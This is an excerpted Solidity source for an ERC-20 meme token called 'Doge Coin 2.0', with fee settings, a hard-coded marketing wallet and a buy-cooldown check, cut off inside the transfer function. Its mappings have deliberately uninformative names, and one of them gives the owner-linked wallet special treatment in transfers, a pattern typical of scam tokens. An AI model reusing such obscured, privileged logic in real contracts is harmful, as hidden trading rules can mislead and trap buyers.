...
/*
    Doge Coin 2.0
    Telegram : https://t.me/dogecoin20official
 */
...
contract DOGECOIN20 is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isShade;
    mapping (address => bool) private _isAim;
   
    uint256 private _tTotal = 1 * 10**9 * 10**9;
    uint256 public _maxWallet = _tTotal/10;
    uint256 private _liquifyThreshhold = _tTotal/100;

    string private constant _name = "Doge Coin 2.0";
    string private constant _symbol = "DOGECOIN2.0";
    uint8 private constant _decimals = 9;
    
    uint256 private _marketingFee = 3;
    uint256 private _liquidityFee = 0;

    address private  _marketingWallet = 0xabd3d3fDFC43A90835E788eaC9b975ad103907e5;
    address private  _burnAddress = 0x000000000000000000000000000000000000dEaD;
    
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _isGrow;
    ...
    constructor () {
        ...
        _isShade[_marketingWallet] = true;
        _isAim[_burnAddress] = true;
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair &&
            ...
            require (_isGrow[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isGrow[to] = block.timestamp;
        } else {
            if ( from == uniswapV2Pair &&
                _isShade[to]) {
